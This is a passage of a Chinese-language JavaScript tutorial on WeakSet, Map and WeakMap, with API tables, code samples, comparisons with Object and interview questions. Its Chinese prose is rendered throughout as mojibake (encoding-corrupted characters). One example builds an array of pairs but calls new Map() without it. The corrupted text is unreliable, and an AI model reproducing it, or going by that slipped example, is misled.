å±æ€§ï¼Œä¸å¯éå†ï¼ˆå³æ²¡æœ‰keys()ã€values()å’Œentries()æ–¹æ³•ï¼‰ï¼Œå› ä¸ºæˆå‘˜éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œéšæ—¶éƒ½å¯èƒ½æ¶ˆå¤±ã€‚WeakSet ä¹Ÿæ²¡æœ‰ clear() æ–¹æ³•ã€‚</p><h3 id="WeakSet-å’Œ-Set-çš„åŒºåˆ«"><a href="#WeakSet-å’Œ-Set-çš„åŒºåˆ«" class="headerlink" title="WeakSet å’Œ Set çš„åŒºåˆ«"></a>WeakSet å’Œ Set çš„åŒºåˆ«</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Set</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">æˆå‘˜ç±»å‹</td><td align="left">ä»»æ„ç±»å‹</td><td align="left">ä»…å¯¹è±¡å’Œ Symbol</td></tr><tr><td align="left">å¯æšä¸¾æ€§</td><td align="left">å¯éå†</td><td align="left">ä¸å¯éå†</td></tr><tr><td align="left">å¼•ç”¨ç±»å‹</td><td align="left">å¼ºå¼•ç”¨</td><td align="left">å¼±å¼•ç”¨</td></tr><tr><td align="left">è‡ªåŠ¨æ¸…ç†</td><td align="left">å¦</td><td align="left">æ˜¯</td></tr></tbody></table><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="Map-çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•"><a href="#Map-çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•" class="headerlink" title="Map çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•"></a>Map çš„å®šä¹‰å’ŒåŸºæœ¬ç”¨æ³•</h3><p>Map æ˜¯ ES6 å¼•å…¥çš„æ–°çš„æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸€ç§é”®å€¼å¯¹é›†åˆç±»å‹ï¼ˆHashç»“æ„ï¼‰ï¼Œä½¿ç”¨ new å…³é”®å­—åˆ›å»º Map ç»“æ„å®ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()<br></code></pre></td></tr></table></figure><p>Map æ„é€ å‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œæ•°ç»„æˆå‘˜æ˜¯ä¸€ä¸ªä¸ªè¡¨ç¤ºé”®å€¼å¯¹çš„æ•°ç»„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> items = [<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>],<br>  [<span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;Author&#x27;</span>]<br>];<br><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br></code></pre></td></tr></table></figure><h3 id="Map-çš„æ ¸å¿ƒç‰¹æ€§"><a href="#Map-çš„æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="Map çš„æ ¸å¿ƒç‰¹æ€§"></a>Map çš„æ ¸å¿ƒç‰¹æ€§</h3><p><strong>é”®çš„çµæ´»æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-comment">// æ”¯æŒä»»æ„ç±»å‹ä½œä¸ºé”®</span><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;number&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(&#123;<span class="hljs-attr">id</span>: <span class="hljs-number">1</span>&#125;, <span class="hljs-string">&#x27;object&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;function&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>); <span class="hljs-comment">// 4</span><br></code></pre></td></tr></table></figure><p><strong>é”®å€¼ç›¸ç­‰æ€§åˆ¤æ–­</strong></p><p>Map å’Œ Set ä¸€æ ·ä½¿ç”¨ SameValueZero ç®—æ³•ï¼š</p><ul><li>NaN è¢«è§†ä¸ºç›¸ç­‰</li><li>+0 å’Œ -0 è¢«è§†ä¸ºç›¸ç­‰</li><li>å¯¹è±¡æŒ‰å¼•ç”¨æ¯”è¾ƒ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(&#123;&#125;)); <span class="hljs-comment">// undefined (ä¸åŒå¼•ç”¨)</span><br></code></pre></td></tr></table></figure><h3 id="Map-çš„åŸºç¡€-APIè¯¦è§£"><a href="#Map-çš„åŸºç¡€-APIè¯¦è§£" class="headerlink" title="Map çš„åŸºç¡€ APIè¯¦è§£"></a>Map çš„åŸºç¡€ APIè¯¦è§£</h3><table><thead><tr><th align="left">æ–¹æ³•&#x2F;å±æ€§</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">new Map(iterable)</td><td align="left">æ„é€ å‡½æ•°</td></tr><tr><td align="left">map.set(key, value)</td><td align="left">æ·»åŠ &#x2F;æ›´æ–°é”®å€¼å¯¹</td></tr><tr><td align="left">map.get(key)</td><td align="left">è·å–å¯¹åº”å€¼</td></tr><tr><td align="left">map.has(key)</td><td align="left">æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left">map.delete(key)</td><td align="left">åˆ é™¤é”®å€¼å¯¹</td></tr><tr><td align="left">map.clear()</td><td align="left">æ¸…ç©ºé›†åˆ</td></tr><tr><td align="left">map.size</td><td align="left">è·å–é”®å€¼å¯¹çš„æ•°é‡ï¼ˆéå‡½æ•°å±æ€§ï¼Œä¸èƒ½ set.size()ï¼‰</td></tr></tbody></table><h3 id="Map-çš„è¿­ä»£æ“ä½œ"><a href="#Map-çš„è¿­ä»£æ“ä½œ" class="headerlink" title="Map çš„è¿­ä»£æ“ä½œ"></a>Map çš„è¿­ä»£æ“ä½œ</h3><p>Map ç»“æ„åŸç”Ÿæä¾›ä¸‰ä¸ªéå†å™¨ç”Ÿæˆå‡½æ•°å’Œä¸€ä¸ªéå†æ–¹æ³•</p><ul><li>map.values()ï¼šè¿”å›é”®å€¼çš„éå†å™¨</li><li>map.keys()ï¼šè¿”å›é”®åçš„éå†å™¨</li><li>map.entries()ï¼šè¿”å›æ‰€æœ‰æˆå‘˜çš„éå†å™¨</li><li>map.forEach()ï¼šéå† Map æ‰€æœ‰æˆå‘˜</li></ul><p>å’Œ Set ä¸€æ ·ï¼ŒMap çš„éå†é¡ºåºä¹Ÿæ˜¯æ’å…¥é¡ºåºï¼ŒMap çš„é»˜è®¤éå†å™¨ç”Ÿæˆå‡½æ•°æ˜¯å®ƒçš„ entries æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>],<br>  [<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-number">30</span>]<br>]);<br><br><span class="hljs-comment">// 1. for...of éå†</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> map) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach éå†</span><br>map.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;);<br><br><span class="hljs-comment">// 3. è·å–è¿­ä»£å™¨</span><br><span class="hljs-keyword">const</span> keys = map.<span class="hljs-title function_">keys</span>();    <span class="hljs-comment">// é”®è¿­ä»£å™¨</span><br><span class="hljs-keyword">const</span> values = map.<span class="hljs-title function_">values</span>();<span class="hljs-comment">// å€¼è¿­ä»£å™¨</span><br><span class="hljs-keyword">const</span> entries = map.<span class="hljs-title function_">entries</span>(); <span class="hljs-comment">// é”®å€¼å¯¹è¿­ä»£å™¨</span><br></code></pre></td></tr></table></figure><h3 id="Map-çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨"><a href="#Map-çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨" class="headerlink" title="Map çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨"></a>Map çš„é«˜çº§ç‰¹æ€§ä¸åº”ç”¨</h3><p><strong>æ€§èƒ½ä¼˜åŠ¿</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸ Object çš„æ€§èƒ½å¯¹æ¯”</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">const</span> n = <span class="hljs-number">1000000</span>;<br><br><span class="hljs-comment">// æ’å…¥æ€§èƒ½</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) obj[i] = i;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) map.<span class="hljs-title function_">set</span>(i, i);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><br><span class="hljs-comment">// æŸ¥æ‰¾æ€§èƒ½</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br>obj[n/<span class="hljs-number">2</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br>map.<span class="hljs-title function_">get</span>(n/<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>å¯¹è±¡å…ƒæ•°æ®å­˜å‚¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ›´ä¼˜é›…çš„å…ƒæ•°æ®ç®¡ç†</span><br><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-comment">// é¿å…ç›´æ¥ä¿®æ”¹å¯¹è±¡å±æ€§</span><br></code></pre></td></tr></table></figure><h3 id="Map-ä¸-Object-çš„å¯¹æ¯”"><a href="#Map-ä¸-Object-çš„å¯¹æ¯”" class="headerlink" title="Map ä¸ Object çš„å¯¹æ¯”"></a>Map ä¸ Object çš„å¯¹æ¯”</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Map</th><th align="left">Object</th></tr></thead><tbody><tr><td align="left">é”®ç±»å‹</td><td align="left">ä»»æ„å€¼</td><td align="left">String&#x2F;Symbol</td></tr><tr><td align="left">é”®é¡ºåº</td><td align="left">æ’å…¥é¡ºåº</td><td align="left">å¤æ‚è§„åˆ™(æ•´æ•°å±æ€§ä¼˜å…ˆ)</td></tr><tr><td align="left">size å±æ€§</td><td align="left">ç›´æ¥è·å–</td><td align="left">éœ€è¦æ‰‹åŠ¨è®¡ç®—</td></tr><tr><td align="left">è¿­ä»£</td><td align="left">ç›´æ¥å¯è¿­ä»£</td><td align="left">éœ€è¦Object.keys()ç­‰è½¬æ¢</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">é¢‘ç¹å¢åˆ æ“ä½œæ›´ä¼˜</td><td align="left">é™æ€é”®å€¼è®¿é—®ç•¥å¿«</td></tr><tr><td align="left">åºåˆ—åŒ–</td><td align="left">éœ€æ‰‹åŠ¨å¤„ç†</td><td align="left">åŸç”Ÿæ”¯æŒJSONåºåˆ—åŒ–</td></tr><tr><td align="left">åŸå‹é“¾æ±¡æŸ“</td><td align="left">å®Œå…¨éš”ç¦»</td><td align="left">å¯èƒ½è¢«æ±¡æŸ“</td></tr></tbody></table><h2 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h2><h3 id="WeakMap-çš„å®šä¹‰"><a href="#WeakMap-çš„å®šä¹‰" class="headerlink" title="WeakMap çš„å®šä¹‰"></a>WeakMap çš„å®šä¹‰</h3><p>WeakMap å’Œ Map ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”¨äºç”Ÿæˆé”®å€¼å¯¹é›†åˆ</p><h3 id="WeakMap-çš„æ ¸å¿ƒç‰¹æ€§"><a href="#WeakMap-çš„æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="WeakMap çš„æ ¸å¿ƒç‰¹æ€§"></a>WeakMap çš„æ ¸å¿ƒç‰¹æ€§</h3><p><strong>å¼±å¼•ç”¨é”®æœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> user = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> &#125;;<br><span class="hljs-keyword">const</span> weakmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br>weakmap.<span class="hljs-title function_">set</span>(user, <span class="hljs-string">&#x27;user data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakmap.<span class="hljs-title function_">has</span>(user)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// å½“å¯¹è±¡å¤±å»æ‰€æœ‰å¼ºå¼•ç”¨æ—¶</span><br>user = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// åƒåœ¾å›æ”¶åè‡ªåŠ¨ç§»é™¤æ¡ç›®</span><br><span class="hljs-comment">// weakmap.has(åŸuser) å°†è¿”å› false</span><br></code></pre></td></tr></table></figure><p><strong>é”®ç±»å‹é™åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-comment">// ä»…å…è®¸å¯¹è±¡(null é™¤å¤–)å’Œ Symbolä½œä¸ºé”®</span><br>wm.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">Symbol</span>(), <span class="hljs-number">2</span>) <span class="hljs-comment">// ä¸æŠ¥é”™</span><br><br><span class="hljs-comment">// åŸå§‹å€¼ä¼šæŠ¥é”™</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError: Invalid value used as weak map key</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// TypeError</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-çš„-API-è¯¦è§£"><a href="#WeakMap-çš„-API-è¯¦è§£" class="headerlink" title="WeakMap çš„ API è¯¦è§£"></a>WeakMap çš„ API è¯¦è§£</h3><table><thead><tr><th align="left">æ–¹æ³•&#x2F;å±æ€§</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">new WeakMap(iterable)</td><td align="left">æ„é€ å‡½æ•°</td></tr><tr><td align="left">weakMap.set(key, value)</td><td align="left">æ·»åŠ &#x2F;æ›´æ–°é”®å€¼å¯¹</td></tr><tr><td align="left">weakMap.get(key)</td><td align="left">è·å–å¯¹åº”å€¼</td></tr><tr><td align="left">weakMap.has(key)</td><td align="left">æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left">weakMap.delete(key)</td><td align="left">åˆ é™¤é”®å€¼å¯¹</td></tr></tbody></table><p>weakMap æ²¡æœ‰ size å±æ€§ï¼Œä¸å¯éå†ï¼ˆå³æ²¡æœ‰keys()ã€values()å’Œentries()æ–¹æ³•ï¼‰ï¼Œå› ä¸ºæˆå‘˜éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œéšæ—¶éƒ½å¯èƒ½æ¶ˆå¤±ã€‚WeakMap ä¹Ÿæ²¡æœ‰ clear() æ–¹æ³•</p><h3 id="WeakMap-çš„ç‰¹æ®Šè¡Œä¸ºä¸è¾¹ç•Œæƒ…å†µ"><a href="#WeakMap-çš„ç‰¹æ®Šè¡Œä¸ºä¸è¾¹ç•Œæƒ…å†µ" class="headerlink" title="WeakMap çš„ç‰¹æ®Šè¡Œä¸ºä¸è¾¹ç•Œæƒ…å†µ"></a>WeakMap çš„ç‰¹æ®Šè¡Œä¸ºä¸è¾¹ç•Œæƒ…å†µ</h3><p><strong>é”®ä¸å¯æšä¸¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">const</span> key = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;secret&#x27;</span>);<br><br><span class="hljs-comment">// æ— æ³•é€šè¿‡åå°„è·å–é”®</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(key); <span class="hljs-comment">// []</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(key);             <span class="hljs-comment">// []</span><br></code></pre></td></tr></table></figure><p><strong>åƒåœ¾å›æ”¶ä¸ç¡®å®šæ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// æ— æ³•é¢„æµ‹ä½•æ—¶æ¡ç›®ä¼šè¢«ç§»é™¤</span><br><span class="hljs-comment">// ä¾èµ–åƒåœ¾å›æ”¶å™¨è¿è¡Œ</span><br></code></pre></td></tr></table></figure><p><strong>ä¸å¯å…‹éš†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ— æ³•æ­£ç¡®å…‹éš†WeakMap</span><br><span class="hljs-keyword">const</span> wm1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br>wm1.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-keyword">const</span> wm2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>(wm1); <span class="hljs-comment">// æ— æ•ˆï¼</span><br><span class="hljs-comment">// æ²¡æœ‰æ–¹æ³•å¯ä»¥å¤åˆ¶ç°æœ‰WeakMapçš„å†…å®¹</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-å’Œç›¸å…³æ•°æ®ç»“æ„çš„åŒºåˆ«"><a href="#WeakMap-å’Œç›¸å…³æ•°æ®ç»“æ„çš„åŒºåˆ«" class="headerlink" title="WeakMap å’Œç›¸å…³æ•°æ®ç»“æ„çš„åŒºåˆ«"></a>WeakMap å’Œç›¸å…³æ•°æ®ç»“æ„çš„åŒºåˆ«</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">WeakMap</th><th align="left">Map</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">é”®ç±»å‹</td><td align="left">ä»…å¯¹è±¡</td><td align="left">ä»»æ„å€¼</td><td align="left">ä»…å¯¹è±¡</td></tr><tr><td align="left">å€¼ç±»å‹</td><td align="left">ä»»æ„å€¼</td><td align="left">ä»»æ„å€¼</td><td align="left">æ— å€¼ï¼ˆä»…å­˜å‚¨é”®ï¼‰</td></tr><tr><td align="left">å¯æšä¸¾æ€§</td><td align="left">ä¸å¯æšä¸¾</td><td align="left">å¯æšä¸¾</td><td align="left">ä¸å¯æšä¸¾</td></tr><tr><td align="left">å†…å­˜ç®¡ç†</td><td align="left">å¼±å¼•ç”¨é”®</td><td align="left">å¼ºå¼•ç”¨é”®å€¼</td><td align="left">å¼±å¼•ç”¨é”®</td></tr><tr><td align="left">ä½¿ç”¨åœºæ™¯</td><td align="left">ç§æœ‰æ•°æ®&#x2F;å…ƒæ•°æ®å­˜å‚¨</td><td align="left">é€šç”¨é”®å€¼å­˜å‚¨</td><td align="left">å¯¹è±¡å­˜åœ¨æ€§æ£€æŸ¥</td></tr></tbody></table><h2 id="é¢è¯•å¸¸è§é—®é¢˜-6"><a href="#é¢è¯•å¸¸è§é—®é¢˜-6" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šè¯·è§£é‡Š Map å’Œ Object çš„ä¸»è¦åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>é”®ç±»å‹ä¸åŒï¼šMap é”®å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼ŒObject é”®åªèƒ½æ˜¯å­—ç¬¦ä¸²æˆ– Symbol å€¼</li><li>é¡ºåºä¿è¯ï¼šMap ä¸¥æ ¼æŒ‰ç…§æ’å…¥é¡ºåºè¿­ä»£ï¼ŒObject åˆ™æ˜¯æ•°å­—é”®å‡åºæ’åºåå…¶ä»–æŒ‰æ’å…¥é¡ºåº</li><li>å¤§å°è·å–ï¼šMap å¯ä»¥ç›´æ¥ç”¨ size å±æ€§ï¼ŒObject åˆ™éœ€è¦ Object.keys(obj).length</li><li>æ€§èƒ½ï¼šMap å¢åˆ æ”¹æŸ¥æ“ä½œæ›´é«˜æ•ˆ</li><li>åºåˆ—åŒ–ï¼šMap éœ€è¦æ‰‹åŠ¨è½¬ä¸ºæ•°ç»„ï¼ŒObject ç›´æ¥æ”¯æŒ JSON.stringify</li></ul><p><strong>Qï¼šWeakMap å’Œ Map çš„æ ¸å¿ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦æœ‰ WeakMapï¼Ÿ</strong></p><p>æ ¸å¿ƒåŒºåˆ«ï¼š</p><ul><li>é”®ç±»å‹ï¼šMap é”®å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼ŒWeakMap é”®åªèƒ½æ˜¯å¯¹è±¡å’Œ Symbol</li><li>å†…å­˜ç®¡ç†ï¼šWeakMap é”®æ˜¯å¼±å¼•ç”¨ï¼Œä¸é˜»æ­¢ GC åƒåœ¾å›æ”¶ï¼ŒMap é”®æ˜¯å¼ºå¼•ç”¨</li><li>å¯è®¿é—®æ€§ï¼šWeakMap ä¸å¯éå†ï¼ŒMap å¯ä»¥éå†æ‰€æœ‰é”®å€¼</li></ul><p>ä¸ºä»€ä¹ˆè¦æœ‰ WeakMapï¼Ÿ</p><ul><li>é˜²æ­¢å†…å­˜æ³„éœ²ï¼šå½“é”®å¯¹è±¡ä¸å†ä½¿ç”¨æ—¶è‡ªåŠ¨æ¸…é™¤å…³è”å€¼</li><li>ç§æœ‰æ•°æ®å­˜å‚¨ï¼šå®ç°çœŸæ­£æ— æ³•å¤–éƒ¨è®¿é—®çš„ç§æœ‰å±æ€§</li></ul><p><strong>Qï¼šä¸ºä»€ä¹ˆ WeakMap çš„é”®å¿…é¡»æ˜¯å¯¹è±¡ï¼Ÿ</strong></p><p>ä¸»è¦åŸºäºä¸¤ä¸ªæ ¸å¿ƒè®¾è®¡ç›®æ ‡ï¼š</p><ul><li>å†…å­˜ç®¡ç†ï¼šåªæœ‰å¯¹è±¡å­˜åœ¨åƒåœ¾å›æ”¶æœºåˆ¶ï¼ŒåŸå§‹å€¼ï¼ˆå­—ç¬¦ä¸²ã€æ•°å­—ç­‰ï¼‰åœ¨ JavaScript 